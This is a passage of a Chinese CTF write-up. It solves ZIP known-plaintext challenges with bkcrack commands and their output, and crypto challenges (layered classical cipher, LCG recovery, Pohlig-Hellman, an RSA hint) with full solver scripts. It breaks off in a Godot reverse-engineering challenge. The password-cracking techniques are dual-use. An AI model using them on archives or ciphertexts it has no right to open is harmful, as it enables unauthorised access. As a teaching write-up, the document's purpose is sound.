❯ bkcrack -C DoYouKnowZip.zip -k ea598753 88ae54fe fc2916b2 -D unlocked.zip
bkcrack 1.8.1 - 2025-10-25
[09:45:37] Writing decrypted archive unlocked.zip
100.0 % (3 / 3)
```

密钥如下 `ea598753 88ae54fe fc2916b2`。

得到解密重命名后的压缩包 `unlocked.zip`。

#### Track 9 已知明文攻击 - 单压缩包

这题直接给了压缩包，还是和上面一样直接进行已知明文攻击。

```bash
❯ bkcrack -C DoYouReallyKnowZip.zip --cipher-index 0 -P meme_ref.zip --plain-index 0
bkcrack 1.8.1 - 2025-10-25
[09:48:07] Z reduction using 95488 bytes of known plaintext
7.2 % (6895 / 95488)
[09:48:08] Attack on 211 Z values at index 89442
Keys: 6306b96a 1efb7f19 9a786c60
90.0 % (190 / 211)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 190
[09:48:08] Keys
6306b96a 1efb7f19 9a786c60

❯ bkcrack -C DoYouReallyKnowZip.zip -k 6306b96a 1efb7f19 9a786c60 -D unlocked_2.zip
bkcrack 1.8.1 - 2025-10-25
[09:49:49] Writing decrypted archive unlocked_2.zip
100.0 % (2 / 2)
```

密钥如下：`6306b96a 1efb7f19 9a786c60`。

得到解密重命名后的压缩包 `unlocked_2.zip`。

#### Track 10 已知明文攻击 - OLE 文件头

搜索 OLE 的文件特征发现有一个几乎固定的头部 D0CF11E0A1B11AE10000000000000000。

我们尝试直接进行已知明文攻击：

```bash
❯ bkcrack -C AreYouSureYouKnowZip.zip -c ole.doc -x 0 D0CF11E0A1B11AE10000000000000000
bkcrack 1.8.1 - 2025-10-25
[10:46:12] Z reduction using 9 bytes of known plaintext
100.0 % (9 / 9)
[10:46:12] Attack on 723659 Z values at index 6
Keys: a1a368c1 d72f8a9f eabfb3b7
64.3 % (465453 / 723659)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 465453
[11:02:39] Keys
a1a368c1 d72f8a9f eabfb3b7
```

速度有点慢，而且能不能爆破出来还有点没底，所以这一步尝试需要一点勇气。

密钥如下：`a1a368c1 d72f8a9f eabfb3b7`。

得到解密重命名后的压缩包 `unlocked_3.zip`。

#### Track 11 已知明文攻击 - PNG IEND 文件尾

有了上一步的前车之鉴我们这一步就很容易猜得出来是要靠 png 的固定字节来爆破了。

尝试使用 png 头部爆破发现没有结果，不知道是不是魔改了。

这里检查一下图片的大小尝试利用 png 的尾部爆破：

```bash
> bkcrack -C \unlocked_3\DoYouReallyReallyKnowZip.zip -c flag.png -x 110400 0000000049454E44AE426082
bkcrack 1.8.1 - 2025-10-25
[23:40:10] Z reduction using 4 bytes of known plaintext
100.0 % (4 / 4)
[23:40:10] Attack on 1442750 Z values at index 110407
Keys: f42cc00d 95db89f2 6c1f9d73
3.5 % (49782 / 1442750)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 49782
[23:40:32] Keys
f42cc00d 95db89f2 6c1f9d73
```

密钥如下：`f42cc00d 95db89f2 6c1f9d73`。

最后的解压得到 `flag.png`

![](https://img.halfcity.top/2026/11/10/84b92db4af40268c56cb61e209334ac7.png)

```txt
flag{fb2fdc56-9154-97d2-1778-bbd0dad2d325}
```

## Crypto

### Layered Crypt

分析给出的加密文件。

encrypt1(m, key)：Vigenère（仅处理字母，key 循环移位）。

multi_encode2(text1, iterations)：随机 1~100 次交替 b16encode / b32encode / b64encode。

encrypt3(text, shift)：递进 Caesar（每字符 cur 自增 1，仅移位字母）。

密文特征：

- 仅含 0-9A-Z（无小写、+/=）。
- 最后一层必为 b16（只有它能产生 0-9A-F，递进移位后变成完整 0-9A-Z）。
- shift % 26 可通过“解移位后字母必须落在 A-F”唯一确定。

解密脚本如下：

```py
import base64
from collections import Counter
import string

def recover_text2(cipher: str) -> str:
    """反推 encrypt3，恢复 text2（纯大写十六进制）"""
    # 枚举 shift % 26，要求所有字母解移位后落在 A-F
    possible_s = []
    for s in range(26):
        ok = True
        for i, ch in enumerate(cipher):
            if ch.isalpha():
                val = (ord(ch) - ord('A') - s - i) % 26
                if val > 5:          # 必须是 A-F
                    ok = False
                    break
        if ok:
            possible_s.append(s)
    assert len(possible_s) == 1, f"期望唯一 s，得到 {possible_s}"
    s = possible_s[0]
    print(f"[+] shift % 26 = {s}")

    text2 = []
    for i, ch in enumerate(cipher):
        if ch.isalpha():
            val = (ord(ch) - ord('A') - s - i) % 26
            text2.append(chr(val + ord('A')))
        else:
            text2.append(ch)
    text2 = ''.join(text2)
    assert all(c in '0123456789ABCDEF' for c in text2)
    return text2


def peel_encodings(text2: str) -> str:
    data = text2.encode('ascii')
    layers = []

    for _ in range(120):
        candidates = []
        # b16
        try:
            if len(data) % 2 == 0:
                dec = base64.b16decode(data, casefold=True)
                candidates.append(('b16', dec))
        except Exception:
            pass
        # b32
        try:
            pad = (8 - len(data) % 8) % 8
            dec = base64.b32decode(data + b'=' * pad)
            candidates.append(('b32', dec))
        except Exception:
            pass
        # b64
        try:
            pad = (4 - len(data) % 4) % 4
            dec = base64.b64decode(data + b'=' * pad)
            candidates.append(('b64', dec))
        except Exception:
            pass

        if not candidates:
            break

        # 优先选择结果为可打印 ASCII 的解码
        best = None
        for name, dec in candidates:
            try:
                as_str = dec.decode('ascii')
                if all(32 <= ord(c) < 127 for c in as_str):
                    best = (name, dec, as_str)
                    break
            except Exception:
                continue

        if best is None:
            break

        name, dec, as_str = best
        layers.append(name)
        data = dec

        # 已经很短且不再像编码字符串 → 停止
        if len(data) < 400 and not all(
            c in string.ascii_letters + string.digits + '+/=' for c in as_str
        ):
            break

    print(f"[+] 剥离层数: {len(layers)}")
    print(f"[+] 层顺序(从外到内): {layers}")
    return data.decode('ascii')


def break_vigenere(text1: str) -> tuple[str, str]:
    """经典频率分析破 Vigenère，返回 (key, plaintext)"""
    # 提取纯大写字母
    cipher_letters = ''.join(c.upper() for c in text1 if c.isalpha())

    # 英文频率
    eng_freq = {
        'A': 0.08167, 'B': 0.01492, 'C': 0.02782, 'D': 0.04253, 'E': 0.12702,
        'F': 0.02228, 'G': 0.02015, 'H': 0.06094, 'I': 0.06966, 'J': 0.00153,
        'K': 0.00772, 'L': 0.04025, 'M': 0.02406, 'N': 0.06749, 'O': 0.07507,
        'P': 0.01929, 'Q': 0.00095, 'R': 0.05987, 'S': 0.06327, 'T': 0.09056,
        'U': 0.02758, 'V': 0.00978, 'W': 0.02360, 'X': 0.00150, 'Y': 0.01974, 'Z': 0.00074
    }

    def chi2(s: str) -> float:
        n = len(s)
        if n == 0:
            return 999.0
        freqs = Counter(s)
        return sum((freqs.get(c, 0)/n - eng_freq[c])**2 / eng_freq[c]
                   for c in string.ascii_uppercase)

    # IC 找密钥长度（本例最优为 8）
    def ic(s: str) -> float:
        n = len(s)
        if n < 2:
            return 0.0
        freqs = Counter(s)
        return sum(f*(f-1) for f in freqs.values()) / (n*(n-1))

    best_len, best_ic = 1, 0.0
    for kl in range(1, 21):
        avg = sum(ic(cipher_letters[i::kl]) for i in range(kl)) / kl
        if avg > best_ic:
            best_ic, best_len = avg, kl
    print(f"[+] 推测密钥长度: {best_len} (IC≈{best_ic:.4f})")

    # 对每个位置做卡方检验求最优移位
    key_chars = []
    for i in range(best_len):
        sub = cipher_letters[i::best_len]
        best_shift, best_score = 0, 999.0
        for sh in range(26):
            dec = ''.join(chr((ord(c)-ord('A')-sh) % 26 + ord('A')) for c in sub)
            score = chi2(dec)
            if score < best_score:
                best_score, best_shift = score, sh
        key_chars.append(chr(best_shift + ord('A')))
    key = ''.join(key_chars)
    print(f"[+] 密钥: {key}")

    # 解密
    def decrypt_vigenere(text: str, key: str) -> str:
        res, kid = [], 0
        for ch in text:
            if ch.isalpha():
                base = ord('A') if ch.isupper() else ord('a')
                sh = ord(key[kid % len(key)].upper()) - ord('A')
                res.append(chr((ord(ch) - base - sh) % 26 + base))
                kid += 1
            else:
                res.append(ch)
        return ''.join(res)

    plaintext = decrypt_vigenere(text1, key)
    return key, plaintext


def main():
    with open('code.txt', 'r', encoding='utf-8') as f:
        cipher = f.read().strip()

    print("[*] 步骤1: 反推递进 Caesar → text2")
    text2 = recover_text2(cipher)

    print("[*] 步骤2: 逐层剥离 Base 编码 → text1")
    text1 = peel_encodings(text2)
    print(f"[+] text1 长度: {len(text1)}")
    print(text1[:200], "...")

    print("[*] 步骤3: 破 Vigenère")
    key, m = break_vigenere(text1)

    print("\n" + "="*60)
    print("最终明文 m:")
    print(m)
    print("="*60)
    print(f"密钥: {key}")


if __name__ == '__main__':
    main()
```

输出如下：

```txt
> python decrypt.py
[*] 步骤1: 反推递进 Caesar → text2
[+] shift % 26 = 22
[*] 步骤2: 逐层剥离 Base 编码 → text1
[+] 剥离层数: 20
[+] 层顺序(从外到内): ['b16', 'b32', 'b32', 'b32', 'b64', 'b16', 'b64', 'b32', 'b16', 'b16', 'b32', 'b16', 'b64', 'b64', 'b32', 'b64', 'b16', 'b16', 'b32', 'b64']
[+] text1 长度: 356
Achjzdbnjonlwqa: rmi uum qwp dogltlik uwnk bkm kczyyiqb dlcqomgox mt woivabaof fzbxmmuldxkg, tlr bddh clcr mruh dnjbyuieqeghcha ww vyflb wxb lgajom dbmyqev wq baca. Nkqv ql rvy iquam qhys nrz VRT wugs ...
[*] 步骤3: 破 Vigenère
[+] 推测密钥长度: 8 (IC≈0.0536)
[+] 密钥: YOUDIDIT

============================================================
最终明文 m:
Congratulations: you are now familiar with the relevant knowledge of classical cryptography, and have used some vulnerabilities to carry out simple attacks on them. This is the first step for CTF cryptographers . I wish you enjoy the fun of cryptography in the subsequent learning process . flagishere: cIa5slc@I cOd3 1s fUn 7hou9h th3y @r3 n0t 5@f3 3nOu9h
============================================================
密钥: YOUDIDIT
```

```txt
flag{cIa5slc@I_cOd3_1s_fUn_7hou9h_th3y_@r3_n0t_5@f3_3nOu9h}
```

### PRNG_2

题目使用两个独立的 线性同余生成器（LCG）：

$$s_{i+1} = (a \cdot s_i + b) \bmod n$$

其中 $a$、$b$ 是与明文相同比特长度的素数，$n$ 是比特长度多 1 的素数。

- 第一部分：从初始种子 $p_1$（flag 前半）出发，连续迭代 10 次，全部输出（output1）。

- 第二部分：从初始种子 $p_2$（flag 后半）出发，迭代 10 次，只保留奇数步后的状态（i % 2 == 1），即输出 $s_2,s_4,s_6,s_8,s_{10}$（output2）。

#### 第一部分（连续状态恢复）

已知三个连续状态 $s_i,s_{i+1},s_{i+2}$：

$$\begin{align*}
s_{i+1} &\equiv a\cdot s_i + b \pmod{n}\\
s_{i+2} &\equiv a\cdot s_{i+1} + b \pmod{n}
\end{align*}$$

两式相减消掉 $b$：

$$a \equiv (s_{i+2}-s_{i+1})\cdot(s_{i+1}-s_i)^{-1} \pmod{n}$$

再回代求 $b$：

$$b \equiv s_{i+1} - a\cdot s_i \pmod{n}$$

用全部输出验证一致性后，由第一个输出反推初始种子：

$$p_1 \equiv (o_0 - b)\cdot a^{-1} \pmod{n_1}$$

$p_1 < n_1$，唯一确定

#### 第二部分（隔一步状态恢复）

输出的是每隔一步的状态 $t_i = s_{2i+2}$。

两步递推关系为：

$$s_{k+2} = a^2\cdot s_k + b(a+1) \pmod{n}$$

即：

$$t_{i+1} = A\cdot t_i + B \pmod{n},\quad A=a^2,\quad B=b(a+1)$$

用同样方法求出 $A,B$。

因为 $n_2$ 是素数，对 $A$ 求模平方根（Tonelli-Shanks 算法）得到两个候选 $a$（$a$ 与 $-a$），再分别计算：

$$b \equiv B\cdot(a+1)^{-1} \pmod{n_2}$$

筛选出 同时为素数 的那一对 $(a,b)$（符合题目 getPrime 生成方式）。

最后由第一个输出反推：

$$p_2 \equiv (t_0 - B)\cdot A^{-1} \pmod{n_2}$$

拼接将两部分明文按字节拼接即可得到完整 flag。

解密脚本如下：

```py
import random

def long_to_bytes(n: int) -> bytes:
    if n == 0:
        return b'\x00'
    return n.to_bytes((n.bit_length() + 7) // 8, 'big')


def is_prime(n: int, k: int = 12) -> bool:
    """Miller-Rabin 素性测试（确定性足够覆盖 168-bit）"""
    if n <= 1:
        return False
    if n <= 3:
        return True
    if n % 2 == 0:
        return False

    # 写出 n-1 = 2^s * d
    d = n - 1
    s = 0
    while d % 2 == 0:
        d //= 2
        s += 1

    # 对 168-bit 数，这几个基已经足够确定性
    bases = [2, 3, 5, 7, 11, 13, 23, 29, 31, 37]
    for a in bases:
        if a >= n:
            continue
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(s - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True


def tonelli_shanks(n: int, p: int) -> int:
    """计算 n 模奇素数 p 的平方根"""
    assert pow(n, (p - 1) // 2, p) == 1, "不是二次剩余"
    if n == 0:
        return 0
    # 快速路径：p ≡ 3 mod 4
    if p % 4 == 3:
        return pow(n, (p + 1) // 4, p)

    # 分解 p-1 = Q * 2^S
    Q = p - 1
    S = 0
    while Q % 2 == 0:
        Q //= 2
        S += 1

    # 找非二次剩余
    z = 2
    while pow(z, (p - 1) // 2, p) != p - 1:
        z += 1

    m = S
    c = pow(z, Q, p)
    r = pow(n, (Q + 1) // 2, p)
    t = pow(n, Q, p)

    while t != 1:
        # 找最小 i (0 < i < m) 使得 t^{2^i} ≡ 1
        i = 0
        temp = t
        while temp != 1:
            temp = (temp * temp) % p
            i += 1
            if i >= m:
                raise ValueError("No square root exists")
        # 更新
        b = pow(c, 1 << (m - i - 1), p)
        r = (r * b) % p
        c = (b * b) % p
        t = (t * c) % p
        m = i
    return r


def recover_lcg_params(outputs, n):
    """从连续状态恢复 a, b"""
    s0, s1, s2 = outputs[0], outputs[1], outputs[2]
    diff1 = (s1 - s0) % n
    diff2 = (s2 - s1) % n
    a = (diff2 * pow(diff1, -1, n)) % n
    b = (s1 - a * s0) % n
    # 验证所有状态
    for i in range(len(outputs) - 1):
        if (a * outputs[i] + b) % n != outputs[i + 1]:
            raise ValueError("LCG 参数验证失败")
    return a, b


def main():
    # ========== 题目数据 ==========
    n1 = 345134223622032783079861891603548682508177145829327
    output1 = [
        330839794034202427207472630971095027706262016066515,
        207117270962865762741279284229711316037274680157594,
        321630619337144842590729155049041930254500778494595,
        279018642904636806170692019605454218172298842459688,
        73257666380505240523342216196488730390068257083494,
        262605003574917963420333205887758959323129590898843,
        297883743928194730326112948575646978278780812547237,
        12563050321595805393555913504558906099715995945278,
        210594787958272414685984084073600453669550611155703,
        135043240658510317768913877228497338995616361401792
    ]

    n2 = 252359333929140944117674864740305534893587814289093
    output2 = [
        30879929814266350443344267861670172844492662456100,
        36133300745084951798505947884374329171271529323031,
        142262191898417995263001965439693985220619265860585,
        179839309205906046323512790761178931429223389413577,
        244876553270100063362680494485113603921886811448769
    ]

    # ========== 第一部分 ==========
    print("[*] 恢复第一部分 LCG 参数...")
    a1, b1 = recover_lcg_params(output1, n1)
    print(f"    a1 = {a1}")
    print(f"    b1 = {b1}")

    p1 = ((output1[0] - b1) * pow(a1, -1, n1)) % n1
    half1 = long_to_bytes(p1)
    print(f"[+] 前半明文: {half1}")

    # ========== 第二部分 ==========
    print("\n[*] 恢复第二部分两步递推参数 A, B...")
    A, B = recover_lcg_params(output2, n2)
    print(f"    A = {A}")
    print(f"    B = {B}")

    print("[*] 计算 A 的模平方根...")
    sqrt1 = tonelli_shanks(A, n2)
    candidates = [sqrt1, (n2 - sqrt1) % n2]

    a2 = b2 = None
    for cand_a in candidates:
        try:
            inv = pow(cand_a + 1, -1, n2)
            cand_b = (B * inv) % n2
            if is_prime(cand_a) and is_prime(cand_b):
                a2, b2 = cand_a, cand_b
                break
        except ValueError:
            continue

    if a2 is None:
        raise RuntimeError("未找到合法的素数对 (a2, b2)")

    print(f"    a2 = {a2}")
    print(f"    b2 = {b2}")

    # 最终验证
    assert (a2 * a2) % n2 == A
    assert (b2 * (a2 + 1)) % n2 == B

    p2 = ((output2[0] - B) * pow(A, -1, n2)) % n2
    half2 = long_to_bytes(p2)
    print(f"[+] 后半明文: {half2}")

    flag = half1 + half2
    print("\n" + "=" * 50)
    print(f"[+] Flag: {flag.decode()}")
    print("=" * 50)


if __name__ == "__main__":
    main()
```

输出如下：

```txt
> python prng_decrypt.py
[*] 恢复第一部分 LCG 参数...
    a1 = 145424495582725732898799924892598922916299432230689
    b1 = 157817097740657233753049532323533798231689619690069
[+] 前半明文: b'flag{69b8bdd7-a98e-42'

[*] 恢复第二部分两步递推参数 A, B...
    A = 127493981115879572623164979996887693617816899119548
    B = 182819228795212232540344728504035098857603496043689
[*] 计算 A 的模平方根...
    a2 = 96363134065700340835255095067002682077714017895943
    b2 = 145290317527158546885587912146880103158505104712839
[+] 后半明文: b'bc-ad98-7ba4e2c1df56}'

==================================================
[+] Flag: flag{69b8bdd7-a98e-42bc-ad98-7ba4e2c1df56}
==================================================
```

```txt
flag{69b8bdd7-a98e-42bc-ad98-7ba4e2c1df56}
```

### DLP

这是一道离散对数问题：已知 $p$、$g=67$、$h$，求 $x$ 使得
$$h \equiv g^x \pmod{p}$$
其中 x = \text{bytes_to_long}(\text{flag} + \text{padding})。

观察 $p-1$ 的结构$p$ 是一个约 1015-bit 的素数。对 $p-1$ 进行因式分解：

$$p-1 = 2^{32} \times 3^{21} \times 5^{15} \times 7^{41} \times 11^{35} \times 13^{40} \times 17^{48} \times 19^{9} \times 23^{30} \times 29^{33}$$

$p-1$ 完全光滑（所有素因子都非常小）。因此 $g$ 的阶 $\operatorname{ord}_p(g) = p-1$，可以用 Pohlig-Hellman 算法 高效求解 DLP。

Pohlig-Hellman 算法

对每个素因子幂 $q^e \mid (p-1)$，把问题约化到阶为 $q^e$ 的子群：

$$g_q = g^{(p-1)/q^e} \bmod p,\quad
h_q = h^{(p-1)/q^e} \bmod p$$

求 $x_q$ 使得 $g_q^{x_q} \equiv h_q \pmod{p}$，其中 $x_q \bmod q^e$。

对素数幂 $q^e$ 使用逐级提升（lifting）：先求模 $q$ 的解，再逐步提升到 $q^2, q^3, \dots, q^e$。每一步只需要在阶为 $q$ 的循环群中求一次离散对数。

阶为 $q$ 的小群离散对数用 Baby-Step Giant-Step（BSGS） 即可（$q$ 最大也就几十，非常快）。

中国剩余定理（CRT）得到所有同余式$$x \equiv x_q \pmod{q^e}$$后，用 CRT 合并即可得到模 $p-1$ 的唯一解 $x$。

解密脚本如下：

```py
import math
from sympy import factorint
from sympy.ntheory.modular import crt

def bsgs(g, h, p, order):
    """Baby-step giant-step: solve g^x ≡ h (mod p), ord(g)=order"""
    m = math.isqrt(order) + 1
    table = {}
    e = 1
    for j in range(m):
        table[e] = j
        e = (e * g) % p
    inv_gm = pow(pow(g, m, p), -1, p)
    gamma = h
    for i in range(m):
        if gamma in table:
            return i * m + table[gamma]
        gamma = (gamma * inv_gm) % p
    raise ValueError("DL not found")

def pohlig_hellman(g, h, p, factors):
    n = p - 1
    congruences, moduli = [], []
    for q, e in factors.items():
        print(f"[*] Solving subgroup of order {q}^{e} ...", end=" ", flush=True)
        qe = q ** e
        g_q = pow(g, n // qe, p)
        h_q = pow(h, n // qe, p)

        x = 0
        gamma = pow(g_q, qe // q, p)
        for k in range(e):
            hk = pow(h_q * pow(g_q, -x, p) % p, qe // (q ** (k + 1)), p)
            y = bsgs(gamma, hk, p, q)
            x += y * (q ** k)
        print(f"x ≡ {x}")
        congruences.append(x)
        moduli.append(qe)
    return crt(moduli, congruences)[0]

if __name__ == "__main__":
    p = 297751278340429922876319037296834193695260884029022823776771691112509083570192681615128896764413159854049602632753655834969250860917990516463469615318547186067265283559973190956770036737943380819257234228463837255218436679709684989550810248627500085836286956146521450588530741131451722498048000000000000001
    g = 67
    h = 187932374108597972139231537390177634849060339849637386237933234652309505738605832080521003559765407153218343150744608751920963128022039387722132496897198510862825508806829515707220156826677692812227453889380536566602180649139793952454821678889992002679572312352753992000623596893433663213586134172004560486

    factors = factorint(p - 1)
    print("[+] Factorization of p-1:", factors)

    x = pohlig_hellman(g, h, p, factors)
    print("\n[+] Discrete log x =", x)

    msg = x.to_bytes((x.bit_length() + 7) // 8, "big")
    print("[+] Message bytes:", msg)
    print("[+] Flag:", msg.split(b"}")[0].decode() + "}")
```

输出如下：

```txt
> python dlp_decrypt.py
[+] Factorization of p-1: {2: 32, 3: 21, 5: 15, 7: 41, 11: 35, 13: 40, 17: 48, 19: 9, 23: 30, 29: 33}
[*] Solving subgroup of order 2^32 ... x ≡ 2683065240
[*] Solving subgroup of order 3^21 ... x ≡ 3224728631
[*] Solving subgroup of order 5^15 ... x ≡ 11380639846
[*] Solving subgroup of order 7^41 ... x ≡ 5982889439850260430681830064299668
[*] Solving subgroup of order 11^35 ... x ≡ 2405192800283141989504116457657449227
[*] Solving subgroup of order 13^40 ... x ≡ 211741902705524125261262515194713640971133621
[*] Solving subgroup of order 17^48 ... x ≡ 27793648471499967840787429274532914370981201634257210617353
[*] Solving subgroup of order 19^9 ... x ≡ 295674545413
[*] Solving subgroup of order 23^30 ... x ≡ 59038397270900825002575769523176332062502
[*] Solving subgroup of order 29^33 ... x ≡ 1237268971721631893063296386074198016288970993228

[+] Discrete log x = 280953633736579516380006790191442076602299046560224360069384963203268368431485627513231696371620228733414385366446889067539755415508048760406739437507785953738315064708791612842920747273530185036291780563280696406388985155889719324764996561952701472224142224551242795976113541707318812766591925609525171096
[+] Message bytes: b'flag{pohlig_hellman_crt_smooth_group_order}S1\x19d\x95\xb5\x1a\x1d\xeb,\xcb\x03c\x0b]%eGr\x0e\x80og9\xab?\x1d\x06s\x95Y\xda\xd7k\xb3\xc5R+D\x96\xe1\x9b\x9bIFC\xa9c\x83pD\xba\x1c\xbb*\x86jd\xcf;\xe3\xdf0\xb3\xa5\x14\xb5\xefy\x9c\xe22\xf0\xce\x87\xceg\x87q\xb7\x9f\xecS\x98'
[+] Flag: flag{pohlig_hellman_crt_smooth_group_order}
```

```txt
flag{pohlig_hellman_crt_smooth_group_order}
```

### RSA_2

由源码可知：

$e = 65537$
$p,q$ 均为 512-bit 素数且 $q > p$
$n = p q$
$c = m^e \bmod n$
$a,b$ 均为 20-bit 素数
$\mathrm{hint} = (a p + b + q)^{q(p-1)+1} \bmod p$

1. 化简 hint

在模 $p$ 下 $a p \equiv 0$，故

$$\mathrm{hint} \equiv (b+q)^{q(p-1)+1} \pmod{p}.$$

指数可写为

$$q(p-1)+1 = q\cdot(p-1)+1.$$

由 Fermat 小定理（$p\nmid(b+q)$，否则 $\mathrm{hint}=0$，与给定值矛盾）：

$$(b+q)^{p-1}\equiv 1\pmod{p},$$

于是

$$(b+q)^{q(p-1)+1}\equiv(b+q)\cdot 1^q\equiv b+q\pmod{p}.$$

即

$$\mathrm{hint}\equiv q+b\pmod{p}\quad\Rightarrow\quad q+b-\mathrm{hint}=m p$$

$m$ 为正整数。

2. 确定 $m$ 的可能取值

两素数同为 512-bit，故 $p<q<2p$。结合 $\mathrm{hint}<p$ 及 $b<2^{20}$，可知

$$0<q+b-\mathrm{hint}<2p+2^{20},$$

因此 $m=1$ 或 $m=2$。对给定的 $n,\mathrm{hint}$ 的数量级分析（$\sqrt{n}\approx 7.74\times 10^{153}$，$\mathrm{hint}\approx 1.85\times 10^{153}$）表明实际以 $m=1$ 为主。

3. $m=1$ 时的二次方程

假设 $m=1$，则

$$p=q+b-\mathrm{hint}.$$

代入 $n=pq$ 得

$$q^2+(b-\mathrm{hint})q-n=0.$$

判别式

$$\Delta=( \mathrm{hint}-b)^2+4n$$

必须为完全平方 $s^2$，且

$$q=\frac{\mathrm{hint}-b+s}{2}$$

为整数，并满足 $n\bmod q=0$、$p=n/q$ 为素数且 $p<q$。

4. 暴力搜索 $b$

$b$ 为 20-bit 素数（共约 $3.86\times 10^4$ 个）。对每个候选 $b$ 计算 $\Delta$ 并检验是否为完全平方即可。实现时使用 sympy.integer_nthroot。

搜索得到唯一解：

$$b=1037801,$$
$$\begin{align*}
p&=6866323681716969257795127567315445106103921415475902940702694659309786687945290329949653674647467557687118224057619528722699270690995323377583069329362813,\\
q&=8720666768080635701141877044729969565994709984586372548535282850405888781931120757650733396944198532498565877506574168050328692668556327827837452042410779.
\end{align*}$$

验证：两者均为素数、$p q=n$、$q>p$ 且 $p=q+b-\mathrm{hint}$。
（$m=2$ 的情形同样可枚举，但无解。）

5. 解密

$$\phi(n)=(p-1)(q-1),\qquad d=e^{-1}\bmod\phi(n),$$
$$m=c^d\bmod n.$$

还原字节串即得 flag。

解密脚本如下：

```py
from sympy import primerange, integer_nthroot, mod_inverse, isprime

n = 59878920750034253812473916340427652696560588929372376557862758783297756217351793935299237589505012171600483114513575202287730929631181203092270509860028866490602056368325281902687469924527425830180642599931707560453268265288811481630010690956233477339712644022013247635301441507133491427120004941760472961327
c = 40630384401002342470066039506463698639721393853932077385540834977108410392196020666308614792019750257385381212472208140240697164618704604584575103484957043286794695262059432859884887458598880103340996156307514966232819295198837243538574907731969826746889643067794946689997308561092889506010185682571054588232
hint = 1854343086363666443346749477414524459890788569110469607832588191096102093985830427701079722296730974811447653448954639327629421977561004450254382714085767
e = 65537

# 暴力 20-bit 素数 b，求解 m=1 情形
primes = list(primerange(1 << 19, 1 << 20))
p = q = None
for b in primes:
    disc = (hint - b) ** 2 + 4 * n
    s, exact = integer_nthroot(disc, 2)
    if exact and (hint - b + s) % 2 == 0:
        qq = (hint - b + s) // 2
        if qq > 1 and n % qq == 0:
            pp = n // qq
            if pp * qq == n and 1 < pp < qq and isprime(pp) and isprime(qq):
                # 二次确认关系
                if pp == qq + b - hint:
                    p, q = pp, qq
                    break

assert p is not None
print(f"p = {p}")
print(f"q = {q}")
print(f"b = {b}")

# RSA 解密
phi = (p - 1) * (q - 1)
d = mod_inverse(e, phi)
m = pow(c, d, n)
flag = m.to_bytes((m.bit_length() + 7) // 8, "big")
print(flag)
```

输出如下：

```txt
> python rsa_2.py
p = 6866323681716969257795127567315445106103921415475902940702694659309786687945290329949653674647467557687118224057619528722699270690995323377583069329362813
q = 8720666768080635701141877044729969565994709984586372548535282850405888781931120757650733396944198532498565877506574168050328692668556327827837452042410779
b = 1037801
b"flag{y0u_kn0w_RS@_and_f3rmat's_1ittl3_the0r3m}"
```

```txt
flag{y0u_kn0w_RS@_and_f3rmat's_1ittl3_the0r3m}
```

## Week 3

---

## Reverse

### 十重奇迹

下完附件看到程序挺大的，猜测应该是一个 GUI 程序。

双击看看：

![](https://img.halfcity.top/2026/11/10/867b4c79867c9e84d5f1bef66a46aced.png)

看起来是一个游戏吗？左上角 godot 的图标很明显，那么我们直接尝试解包即可，这里的交互就不看了。

我们使用[这个](https://github.com/GDRETools/gdsdecomp/releases)工具来解包：

![](https://img.halfcity.top/2026/11/10/1575ae9f966e5aff07bce90216ac1c0a.png)

在游戏脚本文件中可以找 flag 的加密逻辑：

![](https://img.halfcity.top/2026/11/10/dda9f0fbcb0ce02877635b93d0a89ad8.png)

```gdscript
extends RefCounted
class_name AstralCipher

# Standard SM4 substitution table, modified 24-round data transformation.
const SBOX_HEX := (
    "d690e9fecce13db716b614c228fb2c05"
    + "2b679a762abe04c3aa44132649860699"
    + "9c4250f491ef987a33540b43edcfac62"
    + "e4b31ca9c908e89580df94fa758f3fa6"
    + "4707a7fcf37317ba83593c19e6854fa8"
    + "686b81b27164da8bf8eb0f4b70569d35"
    + "1e240e5e6358d1a225227c3b01217887"
    + "d40046579fd327524c3602e7a0c4c89e"
    + "eabf8ad240c738b5a3f7f2cef96115a1"
    + "e0ae5da49b341a55ad933230f58cb1e3"
    + "1df6e22e8266ca60c02923ab0d534e6f"
    + "d5db3745defd8e2f03ff6a726d6c5b51"
    + "8d1baf92bbddbc7f11d95c411f105ad8"
    + "0ac13188a5cd7bbd2d74d012b8e5b4b0"
    + "8969974a0c96777e65b9f109c56ec684"
    + "18f07dec3adc4d2079ee5f3ed7cb3948"
)
const FK := [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]
const MASK := 0xffffffff
static var _box: PackedByteArray = PackedByteArray()

static func _sha256(data: PackedByteArray) -> PackedByteArray:
    var h := HashingContext.new()
    if h.start(HashingContext.HASH_SHA256) != OK:
        return PackedByteArray()
    h.update(data)
    return h.finish()

static func golden_seal(slot: int) -> PackedByteArray:
    var phrase := "CHALDEA/SEAL/v1|%d|LUMEN-2731" % slot
    return _sha256(phrase.to_utf8_buffer()).slice(4, 12)

static func _derive_key(seals: Array[PackedByteArray]) -> PackedByteArray:
    var buf := "CHALDEA/TENFOLD/MNEMOSYNE|".to_utf8_buffer()
    for i in range(10):
        buf.append(i)
        buf.append_array(seals[i])
    buf.append_array("|STARS-ARE-WITNESSES".to_utf8_buffer())
    return _sha256(buf).slice(0, 16)

static func _rol(x: int, n: int) -> int:
    x &= MASK
    return ((x << n) | (x >> (32 - n))) & MASK

static func _load_u32(b: PackedByteArray, at: int) -> int:
    return (int(b[at]) << 24) | (int(b[at + 1]) << 16) | (int(b[at + 2]) << 8) | int(b[at + 3])

static func _put_u32(out: PackedByteArray, value: int) -> void:
    value &= MASK
    out.append((value >> 24) & 255)
    out.append((value >> 16) & 255)
    out.append((value >> 8) & 255)
    out.append(value & 255)

static func _tau(w: int) -> int:
    if _box.is_empty():
        _box = SBOX_HEX.hex_decode()
    var y := 0
    for j in range(4):
        var shift := 24 - 8 * j
        y |= int(_box[(w >> shift) & 255]) << shift
    return y & MASK

static func _l(w: int) -> int:
    return (w ^ _rol(w, 3) ^ _rol(w, 9) ^ _rol(w, 17) ^ _rol(w, 25)) & MASK

static func _key_l(w: int) -> int:
    return (w ^ _rol(w, 13) ^ _rol(w, 23)) & MASK

static func _round_keys(key: PackedByteArray) -> Array[int]:
    var k: Array[int] = []
    var keys: Array[int] = []
    for i in range(4):
        k.append(_load_u32(key, i * 4) ^ int(FK[i]))
    for rnd in range(24):
        var ck := 0
        for j in range(4):
